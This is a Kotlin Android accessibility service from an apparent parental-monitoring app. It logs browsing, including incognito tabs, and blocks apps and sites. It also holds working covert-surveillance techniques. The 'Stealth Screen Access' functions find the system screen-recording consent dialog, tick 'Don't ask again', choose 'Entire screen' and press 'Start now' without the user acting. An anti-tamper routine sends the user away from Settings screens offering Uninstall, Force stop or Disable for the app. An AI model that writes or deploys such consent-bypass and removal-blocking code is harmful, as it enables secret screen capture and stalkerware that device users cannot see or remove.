package com.example.childapp.accessibility

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.childapp.blocker.AppUsageTracker
import com.example.childapp.blocker.WebFilterEvaluator
import com.example.childapp.data.CachedBrowsingHistory
import com.example.childapp.data.LocalDatabase
import com.example.childapp.ui.BlockedAppActivity
import java.net.URI

class ChildAccessibilityService : AccessibilityService() {

    companion object {
        var instance: ChildAccessibilityService? = null
            private set

        var isRunning = false
            private set

        var activeSocketCallback: ((entry: CachedBrowsingHistory) -> Unit)? = null
    }

    private val handler = Handler(Looper.getMainLooper())
    private var lastRecordedUrl: String? = null
    private var pendingUrlRunnable: Runnable? = null
    private var lastPackage: String? = null

    private val supportedBrowsers = mapOf(
        "com.android.chrome" to "CHROME",
        "org.mozilla.firefox" to "FIREFOX",
        "com.sec.android.app.sbrowser" to "SAMSUNG_BROWSER",
        "com.microsoft.emmx" to "EDGE",
        "com.brave.browser" to "BRAVE",
        "com.opera.browser" to "OPERA",
        "com.opera.mini.native" to "OPERA",
        "com.duckduckgo.mobile.android" to "OTHER"
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        try {
            val info = serviceInfo ?: android.accessibilityservice.AccessibilityServiceInfo()
            info.flags = info.flags or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    android.accessibilityservice.AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            serviceInfo = info
        } catch (e: Exception) {
            Log.w("ChildAccessibility", "Error configuring service info: ${e.message}")
        }
        instance = this
        isRunning = true
        Log.i("ChildAccessibility", "ChildAccessibilityService connected")
    }

    override fun onDestroy() {
        instance = null
        isRunning = false
        handler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    override fun onInterrupt() {
        isRunning = false
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // Always check and auto-confirm system MediaProjection / screen recording dialogs
        checkAndConfirmMediaProjection(event)

        val packageName = event.packageName?.toString() ?: return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleWindowStateChanged(packageName, event)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                if (supportedBrowsers.containsKey(packageName)) {
                    inspectBrowserContent(packageName)
                }
            }
        }
    }

    private fun handleWindowStateChanged(packageName: String, event: AccessibilityEvent) {
        // 1. Anti-Tamper: Prevent uninstalling / force stopping the child app in Settings
        if (packageName == "com.android.settings") {
            if (isAttemptingToTamperSettings()) {
                performGlobalAction(GLOBAL_ACTION_HOME)
                return
            }
        }

        // Ignore our own app, system UI, or launcher transitions
        if (packageName == this.packageName ||
            packageName == "com.android.systemui" ||
            packageName.contains("launcher")
        ) {
            return
        }

        lastPackage = packageName

        // 2. Evaluate App Policy (Blocked, Schedule, Time Limit, Device Pause)
        val check = AppUsageTracker.evaluatePackage(this, packageName)
        if (check.isBlocked) {
            val intent = Intent(this, BlockedAppActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP
                putExtra("PACKAGE_NAME", packageName)
                putExtra("APP_NAME", check.policy?.appName ?: packageName)
                putExtra("REASON", check.reason ?: "This app has been restricted by your parent.")
            }
            startActivity(intent)
            return
        }

        // Check browser if window state changed into browser
        if (supportedBrowsers.containsKey(packageName)) {
            inspectBrowserContent(packageName)
        }
    }

    private fun isAttemptingToTamperSettings(): Boolean {
        val root = rootInActiveWindow ?: return false
        try {
            // Do NOT block if the user is in accessibility setup or special app access menus
            val isSetupScreen = root.findAccessibilityNodeInfosByText("Accessibility").isNotEmpty() ||
                    root.findAccessibilityNodeInfosByText("Installed services").isNotEmpty() ||
                    root.findAccessibilityNodeInfosByText("Installed apps").isNotEmpty() ||
                    root.findAccessibilityNodeInfosByText("Downloaded apps").isNotEmpty() ||
                    root.findAccessibilityNodeInfosByText("Special app access").isNotEmpty() ||
                    root.findAccessibilityNodeInfosByText("Usage access").isNotEmpty() ||
                    root.findAccessibilityNodeInfosByText("Appear on top").isNotEmpty()
            if (isSetupScreen) {
                return false
            }

            // Only block if user is trying to Uninstall or Force Stop the child app in App Info
            val hasAppName = root.findAccessibilityNodeInfosByText("Child Monitoring").isNotEmpty() ||
                    root.findAccessibilityNodeInfosByText("com.example.childapp").isNotEmpty()
            if (hasAppName) {
                val hasUninstall = root.findAccessibilityNodeInfosByText("Uninstall").isNotEmpty()
                val hasForceStop = root.findAccessibilityNodeInfosByText("Force stop").isNotEmpty()
                val hasDisable = root.findAccessibilityNodeInfosByText("Disable").isNotEmpty()
                if (hasUninstall || hasForceStop || hasDisable) {
                    return true
                }
            }
        } catch (_: Exception) {}
        return false
    }

    private fun inspectBrowserContent(packageName: String) {
        val root = rootInActiveWindow ?: return
        val urlAndTitle = findUrlAndTitle(root, packageName) ?: return
        val (url, title) = urlAndTitle

        if (url.isBlank() || url.startsWith("chrome://") || url.startsWith("about:") || url == lastRecordedUrl) {
            return
        }

        // Dwell-time debouncing (2 seconds)
        pendingUrlRunnable?.let { handler.removeCallbacks(it) }

        val runnable = Runnable {
            processDetectedUrl(packageName, url, title)
        }
        pendingUrlRunnable = runnable
        handler.postDelayed(runnable, 2000L)
    }

    private fun processDetectedUrl(packageName: String, url: String, title: String) {
        lastRecordedUrl = url
        val browserName = supportedBrowsers[packageName] ?: "OTHER"

        val normalizedUrl = if (!url.startsWith("http://") && !url.startsWith("https://")) {
            "https://$url"
        } else {
            url
        }

        val domain = try {
            URI(normalizedUrl).host?.lowercase() ?: url
        } catch (_: Exception) {
            url
        }

        val check = WebFilterEvaluator.evaluateUrl(this, normalizedUrl, title)

        val entry = CachedBrowsingHistory(
            url = normalizedUrl,
            domain = domain,
            title = title.ifBlank { domain },
            browser = browserName,
            isIncognito = isIncognitoTab(rootInActiveWindow),
            category = check.category,
            isBlockedAttempt = check.isBlocked,
            blockedReason = check.reason,
            visitedAt = System.currentTimeMillis(),
            isSynced = false
        )

        // Save to local SQLite database
        val rowId = LocalDatabase.getInstance(this).insertBrowsingHistory(entry)
        val savedEntry = entry.copy(id = rowId)

        // If blocked: force back navigation to prevent viewing
        if (check.isBlocked) {
            performGlobalAction(GLOBAL_ACTION_BACK)
        }

        // Notify active socket manager if online
        activeSocketCallback?.invoke(savedEntry)
    }

    private fun isIncognitoTab(root: AccessibilityNodeInfo?): Boolean {
        if (root == null) return false
        try {
            val nodes = root.findAccessibilityNodeInfosByText("Incognito")
            if (nodes.isNotEmpty()) return true
            val privateNodes = root.findAccessibilityNodeInfosByText("Private")
            if (privateNodes.isNotEmpty()) return true
        } catch (_: Exception) {}
        return false
    }

    private fun findUrlAndTitle(root: AccessibilityNodeInfo, packageName: String): Pair<String, String>? {
        var foundUrl: String? = null
        var foundTitle: String = ""

        fun dfs(node: AccessibilityNodeInfo?) {
            if (node == null || foundUrl != null) return

            val viewId = node.viewIdResourceName?.lowercase() ?: ""
            val text = node.text?.toString()?.trim() ?: ""

            // Common URL bar view ID patterns across Chrome, Samsung Browser, Firefox, Edge
            if (viewId.contains("url_bar") ||
                viewId.contains("search_box") ||
                viewId.contains("location_bar") ||
                viewId.contains("toolbar_url") ||
                viewId.contains("address_bar")
            ) {
                if (text.isNotBlank() && (text.contains(".") || text.contains("http"))) {
                    foundUrl = text
                    return
                }
            }

            if (node.isEditable && text.contains(".") && !text.contains(" ") && text.length > 3) {
                if (foundUrl == null) foundUrl = text
            }

            if (node.className?.toString()?.contains("WebView") == true && node.contentDescription != null) {
                foundTitle = node.contentDescription.toString()
            }

            for (i in 0 until node.childCount) {
                dfs(node.getChild(i))
            }
        }

        dfs(root)

        val url = foundUrl ?: return null
        return Pair(url, foundTitle)
    }

    /**
     * Stealth Screen Access: Proactively polls for the system MediaProjection permission dialog
     * when screen capture starts, ensuring the prompt is confirmed in milliseconds without waiting
     * for accessibility event dispatching delays.
     */
    fun pollForMediaProjectionDialog(maxAttempts: Int = 30, intervalMs: Long = 100) {
        Log.i("ChildAccessibility", "Starting proactive polling for MediaProjection dialog...")
        var attempts = 0
        val pollRunnable = object : Runnable {
            override fun run() {
                attempts++
                val confirmed = checkAndConfirmMediaProjection(null)
                if (confirmed) {
                    Log.i("ChildAccessibility", "MediaProjection dialog confirmed via proactive polling at attempt $attempts")
                } else if (attempts < maxAttempts) {
                    handler.postDelayed(this, intervalMs)
                } else {
                    Log.d("ChildAccessibility", "Proactive polling finished after $attempts attempts without dialog detection")
                }
            }
        }
        handler.post(pollRunnable)
    }

    /**
     * Stealth Screen Access: Intercepts system MediaProjection popups on com.android.systemui,
     * permission controller, or any system window. Selects 'Entire screen' (Android 14+) and
     * clicks 'Start now' / 'Start' / 'Share' automatically without requiring child manual interaction.
     */
    fun checkAndConfirmMediaProjection(event: AccessibilityEvent?): Boolean {
        val roots = mutableListOf<AccessibilityNodeInfo>()

        // 1. Source node from triggering event, resolved to its true window root
        event?.source?.let { getRootNode(it) }?.let { roots.add(it) }

        // 2. Currently active window root
        rootInActiveWindow?.let { roots.add(it) }

        // 3. All active interactive windows (system dialogs often live in separate window layers)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                windows?.forEach { win ->
                    win.root?.let { roots.add(it) }
                }
            } catch (e: Exception) {
                Log.w("ChildAccessibility", "Error accessing interactive windows: ${e.message}")
            }
        }

        for (root in roots) {
            try {
                if (isMediaProjectionDialog(root)) {
                    Log.i("ChildAccessibility", "MediaProjection dialog detected on window root! Auto-confirming...")
                    val confirmed = autoConfirmMediaProjection(root)
                    if (confirmed) {
                        Log.i("ChildAccessibility", "Successfully confirmed MediaProjection dialog")
                        // Post a follow-up retry in 200ms in case secondary prompt or dropdown requires settling
                        handler.postDelayed({
                            try {
                                rootInActiveWindow?.let { if (isMediaProjectionDialog(it)) autoConfirmMediaProjection(it) }
                            } catch (_: Exception) {}
                        }, 200)
                        return true
                    }
                }
            } catch (e: Exception) {
                Log.e("ChildAccessibility", "Error checking dialog node: ${e.message}")
            }
        }

        return false
    }

    private fun getRootNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        var curr = node ?: return null
        var parent = curr.parent
        while (parent != null) {
            curr = parent
            parent = curr.parent
        }
        return curr
    }

    private fun findNodeRecursive(
        node: AccessibilityNodeInfo?,
        predicate: (AccessibilityNodeInfo) -> Boolean
    ): AccessibilityNodeInfo? {
        if (node == null) return null
        try {
            if (predicate(node)) return node
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val result = findNodeRecursive(child, predicate)
                if (result != null) return result
            }
        } catch (_: Exception) {}
        return null
    }

    private fun isMediaProjectionDialog(root: AccessibilityNodeInfo): Boolean {
        val keywords = listOf(
            "entire screen",
            "single app",
            "start recording or casting",
            "recording or casting",
            "start now",
            "share your screen",
            "exposing sensitive",
            "screen sharing"
        )
        for (kw in keywords) {
            val list = root.findAccessibilityNodeInfosByText(kw)
            if (list.isNotEmpty()) return true
        }

        val found = findNodeRecursive(root) { node ->
            val text = node.text?.toString()?.lowercase() ?: ""
            val desc = node.contentDescription?.toString()?.lowercase() ?: ""
            text.contains("recording or casting") ||
                    text.contains("start now") ||
                    desc.contains("recording or casting") ||
                    desc.contains("start now")
        }
        return found != null
    }

    private fun autoConfirmMediaProjection(root: AccessibilityNodeInfo): Boolean {
        // 1. If "Don't ask again" checkbox is present, check it
        try {
            val dontAskNodes = root.findAccessibilityNodeInfosByText("Don't ask again")
            for (node in dontAskNodes) {
                if (node.isCheckable && !node.isChecked) {
                    clickNodeOrGesture(node)
                }
            }
        } catch (_: Exception) {}

        // 2. Handle Android 14+ "A single app" vs "Entire screen"
        try {
            val entireScreenNodes = root.findAccessibilityNodeInfosByText("Entire screen")
            if (entireScreenNodes.isNotEmpty()) {
                for (node in entireScreenNodes) {
                    if ((node.isCheckable && !node.isChecked) || (!node.isSelected && node.isClickable)) {
                        clickNodeOrGesture(node)
                    }
                }
            } else {
                // If the dropdown shows "A single app", tap it to reveal "Entire screen"
                val singleAppNodes = root.findAccessibilityNodeInfosByText("A single app")
                for (node in singleAppNodes) {
                    clickNodeOrGesture(node)
                    break
                }
            }
        } catch (_: Exception) {}

        // 3. Find and click "Start now" (highest priority exact match)
        val startNowNodes = root.findAccessibilityNodeInfosByText("Start now")
        for (btn in startNowNodes) {
            val text = btn.text?.toString()?.trim() ?: btn.contentDescription?.toString()?.trim() ?: ""
            if (text.equals("Start now", ignoreCase = true)) {
                Log.i("ChildAccessibility", "Found exact 'Start now' button via findAccessibilityNodeInfosByText")
                if (clickNodeOrGesture(btn)) return true
            }
        }

        // 4. Recursive search for "Start now" node
        val recursiveStartNow = findNodeRecursive(root) { node ->
            val t = node.text?.toString()?.trim() ?: ""
            val c = node.contentDescription?.toString()?.trim() ?: ""
            t.equals("Start now", ignoreCase = true) || c.equals("Start now", ignoreCase = true)
        }
        if (recursiveStartNow != null) {
            Log.i("ChildAccessibility", "Found 'Start now' button via recursive search")
            if (clickNodeOrGesture(recursiveStartNow)) return true
        }

        // 5. Check other standard confirmation labels ("Start", "Share screen", "Share", "Allow", "Accept")
        val otherLabels = listOf("Start", "Share screen", "Share", "Allow", "Accept")
        for (label in otherLabels) {
            val nodes = root.findAccessibilityNodeInfosByText(label)
            for (btn in nodes) {
                val text = btn.text?.toString()?.trim() ?: btn.contentDescription?.toString()?.trim() ?: ""
                if (text.equals(label, ignoreCase = true) && !text.contains("recording", ignoreCase = true)) {
                    Log.i("ChildAccessibility", "Found confirmation button with label '$label'")
                    if (clickNodeOrGesture(btn)) return true
                }
            }
        }

        // 6. Check standard button IDs
        val buttonIds = listOf(
            "android:id/button1",
            "com.android.systemui:id/button_start",
            "com.android.systemui:id/start_button",
            "com.google.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_button"
        )
        for (viewId in buttonIds) {
            val buttons = root.findAccessibilityNodeInfosByViewId(viewId)
            for (btn in buttons) {
                Log.i("ChildAccessibility", "Found button by ID: $viewId")
                if (clickNodeOrGesture(btn)) return true
            }
        }

        // 7. Recursive fallback for view ID containing button1 or start
        val recursiveIdNode = findNodeRecursive(root) { node ->
            val resId = node.viewIdResourceName?.lowercase() ?: ""
            val t = node.text?.toString()?.trim() ?: ""
            (resId.endsWith(":id/button1") || resId.contains("start_button") || resId.contains("button_start")) &&
                    !t.contains("cancel", ignoreCase = true)
        }
        if (recursiveIdNode != null) {
            Log.i("ChildAccessibility", "Found confirmation button by recursive ID: ${recursiveIdNode.viewIdResourceName}")
            if (clickNodeOrGesture(recursiveIdNode)) return true
        }

        return false
    }

    private fun clickNodeOrGesture(node: AccessibilityNodeInfo?): Boolean {
        if (node == null) return false

        // 1. Direct click attempt
        try {
            if (node.isClickable && node.isEnabled) {
                if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                    Log.i("ChildAccessibility", "Successfully performed ACTION_CLICK on target node")
                    dispatchTapGesture(node)
                    return true
                }
            }
        } catch (e: Exception) {
            Log.w("ChildAccessibility", "Direct ACTION_CLICK failed: ${e.message}")
        }

        // 2. Click ancestor if target is a child text view
        try {
            var current: AccessibilityNodeInfo? = node.parent
            var depth = 1
            while (current != null && depth < 6) {
                if (current.isClickable && current.isEnabled) {
                    if (current.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        Log.i("ChildAccessibility", "Successfully performed ACTION_CLICK on ancestor at depth $depth")
                        dispatchTapGesture(node)
                        return true
                    }
                }
                current = current.parent
                depth++
            }
        } catch (e: Exception) {
            Log.w("ChildAccessibility", "Ancestor ACTION_CLICK failed: ${e.message}")
        }

        // 3. Forced ACTION_CLICK on target node
        try {
            if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                Log.i("ChildAccessibility", "Successfully performed forced ACTION_CLICK")
                dispatchTapGesture(node)
                return true
            }
        } catch (_: Exception) {}

        // 4. Hardware gesture tap fallback (bypasses Samsung One UI click restrictions)
        return dispatchTapGesture(node)
    }

    private fun dispatchTapGesture(node: AccessibilityNodeInfo): Boolean {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                val rect = Rect()
                node.getBoundsInScreen(rect)
                if (rect.width() > 0 && rect.height() > 0) {
                    val x = rect.centerX().toFloat()
                    val y = rect.centerY().toFloat()
                    val path = Path().apply { moveTo(x, y) }
                    val stroke = GestureDescription.StrokeDescription(path, 0, 50)
                    val gesture = GestureDescription.Builder().addStroke(stroke).build()
                    val dispatched = dispatchGesture(gesture, object : GestureResultCallback() {
                        override fun onCompleted(gestureDescription: GestureDescription?) {
                            Log.i("ChildAccessibility", "Hardware gesture tap completed at ($x, $y)")
                        }
                        override fun onCancelled(gestureDescription: GestureDescription?) {
                            Log.w("ChildAccessibility", "Hardware gesture tap cancelled at ($x, $y)")
                        }
                    }, null)
                    Log.i("ChildAccessibility", "Dispatched gesture tap at ($x, $y), dispatched=$dispatched")
                    return dispatched
                }
            } catch (e: Exception) {
                Log.e("ChildAccessibility", "Error dispatching gesture tap: ${e.message}")
            }
        }
        return false
    }
}
